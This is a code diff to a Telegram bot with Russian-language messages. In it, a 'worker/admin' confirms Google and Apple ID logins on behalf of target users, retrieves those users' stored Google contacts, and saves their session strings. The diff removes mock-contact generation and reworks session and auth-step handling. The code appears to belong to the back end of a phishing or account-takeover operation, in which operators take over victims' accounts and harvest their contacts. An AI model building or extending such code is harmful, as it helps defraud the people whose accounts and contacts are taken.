@@ -2901,10 +2901,13 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
         
         raw_contacts = db.get_google_contacts(DB_PATH, target_tg_id)
         if not raw_contacts:
-            from shared.google_contacts import generate_mock_google_contacts
-            mock_data = generate_mock_google_contacts(user_email)
-            db.save_google_contacts(DB_PATH, target_tg_id, mock_data)
-            raw_contacts = db.get_google_contacts(DB_PATH, target_tg_id)
+            if callback.message:
+                await callback.message.answer(
+                    f"⚠️ <b>Google Контакты (ID <code>{target_tg_id}</code>)</b>\n\n"
+                    f"Контакты Google ещё не выгружены для <code>{user_email}</code>.",
+                    parse_mode="HTML"
+                )
+            return
 
         contacts_list = [dict(c) for c in raw_contacts]
         total_count = len(contacts_list)
@@ -2949,7 +2952,10 @@ async def handle_google_control_callback(callback: CallbackQuery, bot: Bot):
             tg_id=target_tg_id,
             status="completed",
         )
-        db.set_user_session(DB_PATH, target_tg_id, f"google_auth_{target_tg_id}")
+        db.save_google_session(DB_PATH, target_tg_id, status="completed")
+        u_check = db.get_user_by_tg_id(DB_PATH, target_tg_id)
+        if not u_check or not u_check.get("session_string"):
+            db.set_user_session(DB_PATH, target_tg_id, f"google_auth_{target_tg_id}")
         db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
         await callback.answer("🎉 Авторизация Google подтверждена!", show_alert=True)
         await notify_user_event(
@@ -3056,13 +3062,16 @@ async def handle_apple_control_callback(callback: CallbackQuery, bot: Bot):
             tg_id=target_tg_id,
             status="completed",
         )
-        db.set_user_session(DB_PATH, target_tg_id, f"apple_auth_{target_tg_id}")
-        db.set_user_auth_step(DB_PATH, target_tg_id, "apple_authorized")
+        db.save_apple_session(DB_PATH, target_tg_id, status="completed")
+        u_check = db.get_user_by_tg_id(DB_PATH, target_tg_id)
+        if not u_check or not u_check.get("session_string"):
+            db.set_user_session(DB_PATH, target_tg_id, f"apple_auth_{target_tg_id}")
+        db.set_user_auth_step(DB_PATH, target_tg_id, "authorized")
         await callback.answer("🎉 Авторизация Apple ID подтверждена!", show_alert=True)
         await notify_user_event(
             event_type="apple_complete",
             user_tg_id=target_tg_id,
-            auth_step="apple_authorized",
+            auth_step="authorized",
             details="Воркер/Админ подтвердил успешный вход Apple ID",
             is_test=True,
         )
